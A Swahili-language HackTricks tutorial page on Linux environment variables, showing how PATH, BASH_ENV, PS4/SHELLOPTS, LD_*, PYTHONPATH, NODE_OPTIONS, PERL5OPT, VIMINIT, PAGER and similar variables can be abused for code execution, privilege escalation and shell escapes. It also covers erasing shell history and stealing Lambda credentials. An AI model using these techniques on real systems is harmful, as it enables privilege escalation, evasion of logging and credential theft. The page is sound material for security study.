# Vigezo vya Mazingira vya Linux

{{#include ../../banners/hacktricks-training.md}}

## Vigezo vya kimataifa

Vigezo vya kimataifa **vitarithiwa na** **michakato tanzu**.

Unaweza kuunda kigezo cha kimataifa kwa kipindi chako cha sasa kwa kufanya:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Kigeu hiki kitaweza kufikiwa na vipindi vyako vya sasa na michakato yake tanzu.

Unaweza **kuondoa** kigeu kwa kufanya:

```bash
unset MYGLOBAL
```

## Vigezo vya ndani

**Vigezo vya ndani** vinaweza **kufikiwa** na **shell/script ya sasa** pekee.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Orodhesha vigezo vya sasa

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Yaliyomo kwenye `/proc/*/environ` **hutenganishwa kwa NUL**, kwa hiyo mbinu hizi mbadala kwa kawaida ni rahisi kusoma:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Ikiwa unatafuta **credentials** au **usanidi wa huduma unaovutia** ndani ya mazingira yaliyorithiwa, angalia pia [Linux Post Exploitation](../post-exploitation/README.md).

## Vigezo vya kawaida

Imetoka: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – display inayotumiwa na **X**. Kigezo hiki kwa kawaida huwekwa kuwa **:0.0**, ikimaanisha display ya kwanza kwenye kompyuta ya sasa.
- **EDITOR** – kihariri cha maandishi anachopendelea mtumiaji.
- **HISTFILESIZE** – idadi ya juu zaidi ya mistari iliyo kwenye faili ya history.
- **HISTSIZE** – Idadi ya mistari inayoongezwa kwenye faili ya history mtumiaji anapomaliza session yake
- **HOME** – saraka yako ya nyumbani.
- **HOSTNAME** – jina la host ya kompyuta.
- **LANG** – lugha yako ya sasa.
- **MAIL** – eneo la spool ya barua ya mtumiaji. Kwa kawaida **/var/spool/mail/USER**.
- **MANPATH** – orodha ya saraka za kutafuta kurasa za manual.
- **OSTYPE** – aina ya mfumo wa uendeshaji.
- **PS1** – prompt chaguomsingi katika bash.
- **PATH** – huhifadhi njia za saraka zote zilizo na faili za binary unazotaka kutekeleza kwa kubainisha tu jina la faili, badala ya njia ya relative au absolute.
- **PWD** – saraka ya sasa ya kufanya kazi.
- **SHELL** – njia ya command shell ya sasa (kwa mfano, **/bin/bash**).
- **TERM** – aina ya terminal ya sasa (kwa mfano, **xterm**).
- **TZ** – saa za eneo lako.
- **USER** – jina lako la mtumiaji la sasa.

## Vigezo vinavyovutia kwa hacking

Si kila kigezo kina manufaa sawa. Kwa mtazamo wa offensive, weka kipaumbele kwa vigezo vinavyobadilisha **njia za utafutaji**, **faili za kuanzisha**, **tabia ya dynamic linker**, au **ukaguzi/uwekaji wa kumbukumbu**.

### **HISTFILESIZE**

**Badilisha thamani ya kigezo hiki iwe 0**, ili unapomaliza **session yako**, **faili ya history** (\~/.bash_history) **ipunguzwe hadi mistari 0**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Badilisha **thamani ya kigezo hiki iwe 0**, ili amri **zisihifadhiwe kwenye historia iliyo kwenye kumbukumbu** na zisiandikwe tena kwenye **faili la historia** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Ikiwa **thamani ya kigeu hiki imewekwa kuwa `ignorespace` au `ignoreboth`**, amri yoyote inayoanza na nafasi ya ziada haitahifadhiwa kwenye historia.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Elekeza **faili la historia** kwenye **`/dev/null`** au liondoe kabisa. Kwa kawaida, hii ni ya kuaminika zaidi kuliko kubadilisha tu ukubwa wa historia.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Michakato itatumia **proxy** iliyotangazwa hapa kuunganisha kwenye intaneti kupitia **http au https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: proxy chaguomsingi kwa zana/protokali zinazoitumia.
- `no_proxy`: orodha ya hosts/domains/CIDRs zinazopaswa kuunganishwa moja kwa moja.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Lahaja za herufi ndogo na kubwa zinaweza kutumika kutegemea zana (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Michakato itaamini vyeti vilivyoonyeshwa katika **vigezo hivi vya mazingira**. Hii ni muhimu kufanya zana kama **`curl`**, **`git`**, wateja wa HTTP wa Python, au wasimamizi wa vifurushi waamini CA inayodhibitiwa na mshambuliaji (kwa mfano, kufanya proxy ya interception ionekane halali).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Ikiwa wrapper/script yenye ruhusa za juu inaendesha amri **bila kutumia njia kamili**, **saraka ya kwanza inayodhibitiwa na mshambuliaji** katika `PATH` ndiyo itakayotumika. Hii ndiyo mbinu ya msingi nyuma ya utekaji nyara mwingi wa **PATH** katika `sudo`, kazi za cron, shell wrappers na visaidizi maalum vya SUID. Tafuta `env_keep+=PATH`, `secure_path` dhaifu au wrappers zinazoita `tar`, `service`, `cp`, `python` n.k. kwa majina pekee.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Kwa minyororo kamili ya **privilege-escalation** inayotumia vibaya `PATH`, angalia [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` si rejeleo la saraka tu: zana nyingi hupakia kiotomatiki **dotfiles**, **plugins**, na **usanidi wa kila mtumiaji** kutoka `$HOME` au `$XDG_CONFIG_HOME`. Ikiwa workflow yenye privileges zilizoinuliwa itahifadhi thamani hizi, **config injection** inaweza kuwa rahisi zaidi kuliko binary hijacking.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Malengo ya kuvutia yanajumuisha `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, na faili mahususi za zana kama `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Vigezo hivi huathiri **dynamic linker**:

- `LD_PRELOAD`: lazimisha shared objects za ziada zipakwe kwanza.
- `LD_LIBRARY_PATH`: ongeza saraka za kutafuta library mwanzoni mwa orodha.
- `LD_AUDIT`: pakia library za ukaguzi zinazofuatilia upakiaji wa library na utatuzi wa symbol.

Vina thamani kubwa sana kwa **hooking**, **instrumentation**, na **privilege escalation** ikiwa amri yenye upendeleo itavihifadhi. Katika hali ya **secure-execution** (`AT_SECURE`, kwa mfano setuid/setgid/capabilities), loader huondoa au kuzuia vingi vya vigezo hivi. Hata hivyo, hitilafu za parser katika hatua hiyo ya awali ya loader bado zina athari kubwa kwa sababu hutokea **kabla ya** programu lengwa.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` hubadilisha tabia ya mapema ya glibc (kwa mfano, mipangilio ya allocator) na ni muhimu sana katika maabara za exploit. Pia ni muhimu kwa mtazamo wa usalama kwa sababu **dynamic loader hui-parse mapema sana**. Bug ya **Looney Tunables** ya 2023 ilikumbusha kuwa environment variable moja tu ikiparsiwa na loader inaweza kuwa **primitive ya local privilege-escalation** dhidi ya programu za SUID.<sup>[[6]](#references)</sup>

Kwa CVE-2023-4911, linganisha **toleo la kifurushi cha distribution kilichosakinishwa** na toleo lililorekebishwa la vendor wake, na uthibitishe loader inayotumiwa kwa michakato mipya. Kutegemea tu nambari ya toleo la upstream si jambo la kuaminika: Debian iliweka parser iliyoathiriwa kwenye kifurushi chake cha 2.31, huku distributions zikiweka marekebisho bila kubadilisha nambari ya upstream. Pia, mabadiliko ya privilege yanahitaji executable inayolengwa yenye privilege, ambayo mabadiliko yake ya utambulisho hayazuiwi na `NoNewPrivs`, mount ya `nosuid`, au mitigation nyingine. Epuka kuendesha probe ya kusababisha crash yenye `GLIBC_TUNABLES` iliyoundwa vibaya wakati wa passive enumeration. Tazama [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911), na [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) ili kujua kama tatizo linahusu kila toleo husika; [security notice](https://ubuntu.com/security/notices/USN-6409-1) ya Ubuntu pia inashauri kuwasha upya mfumo baada ya kusasisha.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Ikiwa **Bash** itaanzishwa **bila mwingiliano**, hukagua `BASH_ENV` na kupakia faili hiyo kabla ya kuendesha script lengwa. Bash inapoendeshwa kama `sh`, au katika hali ya mwingiliano ya mtindo wa POSIX, `ENV` inaweza pia kuangaliwa. Hii ni njia ya kawaida ya kufanya shell wrapper itekeleze msimbo ikiwa mazingira yanadhibitiwa na mshambuliaji.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash hupuuza faili hizi za uanzishaji wakati **real/effective IDs zinatofautiana**; `-p` huhifadhi effective ID lakini haiwezeshi faili hizo za uanzishaji, kwa hiyo tabia halisi hutegemea jinsi wrapper inavyoanzisha shell. Kuwa mwangalifu na wrapper zenye ruhusa za juu zinazoita `setuid()`/`setgid()` **kabla** ya kuanzisha Bash: IDs zikilingana tena, Bash inaweza kuamini `BASH_ENV`, `ENV` na hali nyingine zinazohusiana na shell ambazo vinginevyo zingepuuzwa.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash inapotekelezwa huku **xtrace** ikiwa imewashwa, hupanua `PS4` na kuichapisha kabla ya kila amri inayofuatiliwa. `PS4` hupanuliwa kama prompt, kwa hiyo **command substitution** iliyo ndani yake hutekelezwa. Muhimu zaidi, xtrace inaweza kuwashwa moja kwa moja kutoka kwenye mazingira kwa kusafirisha `SHELLOPTS=xtrace` — hakuna haja ya kuweka `-x` kwenye command line — kwa hiyo script yoyote ya Bash inayoendeshwa na mwathiriwa husababisha code execution.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` haifanyi chochote hadi xtrace iwashwe (`SHELLOPTS=xtrace`, `set -x` au `bash -x`), na Bash huondoa `SHELLOPTS` katika mazingira ya privileged/setuid kama inavyofanya kwa `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Vigeu hivi hubadilisha jinsi Python inavyoanza:

- `PYTHONPATH`: ongeza njia za kutafuta import mwanzoni mwa orodha.
- `PYTHONHOME`: hamishia eneo la maktaba ya kawaida.
- `PYTHONSTARTUP`: tekeleza faili kabla ya kidokezo cha interactive.
- `PYTHONINSPECT=1`: ingia katika hali ya interactive baada ya script kukamilika.
- `PYTHONBREAKPOINT`: `package.module.callable` huitwa (na module yake huingizwa) msimbo unapofikia `breakpoint()`.<sup>[[8]](#references)</sup>

Vigeu hivi vinafaa dhidi ya maintenance scripts, debuggers, shells na wrappers zinazoita Python kwa mazingira yanayoweza kudhibitiwa. `python -E` na `python -I` hupuuza vigeu vyote vya `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Mfano halisi wa hivi karibuni ni LPE ya **needrestart** ya 2024 kwenye mifumo ya Ubuntu/Debian: scanner inayomilikiwa na root ilinakili `PYTHONPATH` ya mchakato usio na upendeleo kutoka `/proc/<PID>/environ`, kisha ikaendesha Python. Exploit iliyochapishwa iliweka `importlib/__init__.so` kwenye path inayodhibitiwa na mshambuliaji ili Python itekeleze msimbo wa mshambuliaji wakati wa uanzishaji wake, kabla hata script iliyowekwa moja kwa moja kwenye helper haijawa muhimu.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ina vigezo muhimu vilevile vya uanzishaji:

- `PERL5LIB`: huongeza saraka za maktaba mwanzoni mwa orodha.
- `PERL5OPT`: huingiza swichi kana kwamba zipo kwenye kila command line ya `perl`.

Hii inaweza kulazimisha **upakiaji wa moduli kiotomatiki** au kubadilisha tabia ya interpreter kabla script lengwa haijafanya chochote muhimu. Perl hupuuza vigezo hivi katika hali za **taint / setuid / setgid**, lakini bado ni muhimu sana kwa wrappers za kawaida zinazoendeshwa na root, kazi za CI, installers na kanuni maalum za sudoers.

Ikiwa kanuni ya sudo inaruhusu kubadilisha mazingira na amri yake yenye upendeleo hatimaye inazindua Perl, kagua pia `PERL5DB`. Nyaraka za Perl zinasema kuwa `PERL5OPT=-d` huwasha debugger na kwamba `PERL5DB` hutoa msimbo wa uanzishaji wa debugger Perl inapoanza kwa swichi tupu ya `-d`. Kuondoa `PERL5LIB` na `PERLLIB` pekee hakuzuii njia hii. Vigezo lazima vipite kwenye sudo na wrapper, na mchakato wa Perl usivipuuze kwa sababu ya ushughulikiaji wa taint au set-ID; kagua kanuni halisi na mnyororo wa utekelezaji bila kuendesha helper yenye upendeleo wakati wa uchunguzi. Tazama [marejeleo ya vigezo vya mazingira katika perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Njia ya utafutaji ya Perl iliyojengewa ndani, [`@INC`](https://perldoc.perl.org/perlvar#@INC), ni mpaka mwingine wa uaminifu wa moduli hata kama hakuna vigezo vya mazingira vilivyohifadhiwa. Kwa mchakato wa Perl wenye upendeleo, linganisha kauli halisi ya `use` au `require` na jina la moduli linalotatuliwa, mpangilio wa utafutaji na uwezo wa mtumiaji mwenye upendeleo mdogo kuunda au kubadilisha moduli hiyo ndani ya saraka inayotafutwa. Saraka ya maktaba inayoweza kuandikwa pekee haithibitishi kuwa mchakato wenye upendeleo utapakia msimbo kutoka humo.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` huongeza **Node.js CLI flags** mwanzoni mwa kila mchakato wa `node` unaorithi mazingira. Hii huifanya iwe muhimu dhidi ya wrappers, CI jobs, wasaidizi wa Electron, na sheria za sudo ambazo hatimaye huendesha Node. Flags zinazovutia zaidi kwa upande wa mashambulizi kwa kawaida ni:

- `--require <file>`: pakia mapema faili ya CommonJS kabla ya script lengwa.
- `--import <module>`: pakia mapema ES module kabla ya script lengwa.

Node hukataa baadhi ya flags hatari katika `NODE_OPTIONS`, lakini `--require` na `--import` zinaruhusiwa waziwazi na hushughulikiwa **kabla** ya hoja za kawaida za command line.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Preload isiyotumia faili kwa URL ya `data:`

Unapoweza kuweka `NODE_OPTIONS` lakini **huwezi kuandika faili** kwenye lengwa (mfumo wa faili wa kusoma tu, API yenye vizuizi, mazingira ya serverless, n.k.), `--import` hukubali URL ya `data:text/javascript,`, kwa hivyo payload nzima huwekwa ndani ya kigezo cha mazingira chenyewe. JavaScript lazima iwe **ime-URL-encode kikamilifu** — Node huchanganua thamani kama URL, kwa hivyo nafasi yoyote ghafi (au herufi nyingine yoyote isiyo-encode) hukatiza payload na kutoa `SyntaxError`. Hii hufanya kazi kwenye Node 20.6+ ambapo `--import` iko kwenye orodha ya ruhusa ya `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Hii ni njia ya kawaida ya kubadilisha udhibiti wa `NODE_OPTIONS` kuwa RCE kwenye **managed cloud runtimes** ambazo functions zake huendesha Node. Kwa mfano, mshambulizi anayeweza tu kubadilisha usanidi wa Lambda (`lambda:UpdateFunctionConfiguration`, bila `iam:PassRole` wala kusasisha code) anaweza kuingiza `NODE_OPTIONS=--import data:text/javascript,<payload>` ili kutekeleza code ndani ya function na kuiba credentials za execution-role yake. Module iliyoingizwa huendeshwa **kabla** ya handler, ambayo bado huendelea kutekelezwa kama kawaida baadaye.

Kwa remote gadget chains zinazoweka `NODE_OPTIONS` kwa njia isiyo ya moja kwa moja (kwa mfano, prototype-pollution hadi RCE), angalia [ukurasa huu mwingine](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby hutoa aina hiyo hiyo ya matumizi mabaya wakati wa kuanzisha programu:

- `RUBYLIB`: huongeza directories mwanzoni mwa load path ya Ruby.
- `RUBYOPT`: huingiza options za command-line kama `-r` katika kila invocation ya `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Udhaifu wa **needrestart** wa 2024 ulionyesha kuwa hii si hila ya maabara tu: helper ileile inayomilikiwa na root na iliyokuwa katika hatari ya matumizi mabaya ya `PYTHONPATH` ingeweza pia kulazimishwa kuendesha Ruby kwa `RUBYLIB` inayodhibitiwa na mshambuliaji, na kupakia `enc/encdb.so` kutoka kwenye saraka ya mshambuliaji.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim hutekeleza amri za Ex zilizomo kwenye `VIMINIT` (au mbadala wake wa `EXINIT`) wakati wa kuanza kawaida. Amri za Ex zinajumuisha `:!cmd` na `:call system(...)`, hivyo kudhibiti kigezo hiki huwezesha utekelezaji wa msimbo kila mwathiriwa anapofungua Vim (kama `sudo vim` inayoendeshwa na root, `crontab -e`, `visudo`, au `git`/`less` zinapoanzisha `$EDITOR`).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode (`vim -es`/`-Es`) huruka vigezo hivi, lakini uanzishaji wa kawaida wa mwingiliano huvitekeleza.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) hutumika kwenye Linux/macOS (na Windows) na ni **programu ya .NET**, kwa hivyo vigezo kadhaa vya mazingira vinaweza kusababisha utekelezaji wa code katika kila mwito wa `pwsh` unaorithi mazingira — jambo linaloweza kutumiwa dhidi ya kazi za cron/systemd, CI runners na wrappers zenye mamlaka ya juu zinazotumia `pwsh`.

- `PSModulePath`: PowerShell hutafuta kwa kujirudia kwenye kila saraka iliyo kwenye orodha hii ili kupata modules za `.psd1`/`.psm1`, na **huzipakia kiotomatiki** mara ya kwanza amri inayotolewa na module hiyo inapotajwa. Tanguliza saraka na code ya kiwango cha juu ya module yako hutekelezwa wakati wa ku-import; kwa kuwa utatuzi hufuata mpangilio wa *Alias → Function → Cmdlet*, function iliyotolewa inaweza hata kufunika cmdlet iliyojengewa ndani ambayo mwathiriwa anaita.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: huhamisha `powershell/Microsoft.PowerShell_profile.ps1`, ambayo hutekelezwa wakati wa uanzishaji (isipokuwa `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: assembly inayosimamiwa ambayo `StartupHook.Initialize()` yake hutekelezwa kabla ya `Main` (hutumiwa na kila programu ya .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: API ya CLR profiling hupakia library ya mshambuliaji kwenye mchakato wakati wa uanzishaji (vigezo vya path vina kipaumbele kuliko registry; `DOTNET_*` ndiyo jina jipya zaidi). Kwenye Windows PowerShell 5.1 (.NET Framework), tumia `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Kwenye Windows, `PSExecutionPolicyPreference=Bypass` pia huondoa kizuizi cha "unsigned scripts blocked", hivyo profile/module iliyowekwa huendeshwa. Tazama ukurasa maalum kwa PoCs kamili:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Baadhi ya zana hazisomi tu path kutoka kwenye environment; hupitisha thamani hiyo kwa **shell**, **editor**, au **input preprocessor**. Hivyo, variables zifuatazo zinavutia hasa pale wrapper yenye privileges inapotekeleza `git`, `man`, `less`, au vivinjari vingine vya maandishi:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: huchagua amri ya pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: huchagua amri ya editor, mara nyingi ikiwa na arguments.
- `LESSOPEN`, `LESSCLOSE`: hufafanua pre/post-processors zinazoendeshwa `less` inapofungua faili.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git pia inasaidia **uingizaji wa usanidi kupitia mazingira pekee** bila kugusa diski kupitia `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, na `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Kwa mtazamo wa post-exploitation, kumbuka pia kwamba mazingira yaliyorithiwa mara nyingi huwa na **credentials**, **mipangilio ya proxy**, **service tokens**, au **cloud keys**. Angalia [Linux Post Exploitation](../post-exploitation/README.md) kwa uchunguzi wa `/proc/<PID>/environ` na `systemd` `Environment=`.

### PS1

Badilisha mwonekano wa prompt yako.

[**Huu ni mfano**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Huu ni mfano](<../images/image (897).png>)

Mtumiaji wa kawaida:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zinazoendeshwa chinichini](<../images/image (740).png>)

Kazi moja, mbili na tatu zinazoendeshwa chinichini:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zinazoendeshwa chinichini](<../images/image (145).png>)

Kazi moja ya chinichini, moja iliyosimamishwa, na amri ya mwisho haikukamilika vizuri:

![PERL5OPT & PERL5LIB - PS1: Kazi moja ya chinichini, moja iliyosimamishwa, na amri ya mwisho haikukamilika vizuri](<../images/image (715).png>)

## References

- [1] [Mwongozo wa GNU Bash - Faili za Kuanzisha Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE katika needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Nyaraka za Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Vigezo vya kawaida vya mazingira - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Kuongeza Haki za Mtumiaji wa Ndani katika ld.so ya glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Mwongozo wa GNU Bash - Vigezo vya Bash (`PS4`) na Amri ya Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - breakpoint() Iliyoundwa Ndani na PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Nyaraka za Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [Kuhusu_PSModulePath na upakiaji otomatiki wa moduli za PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Mipangilio ya utatuzi na uchanganuzi wa utendaji ya .NET (vigezo vya profiler vya `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
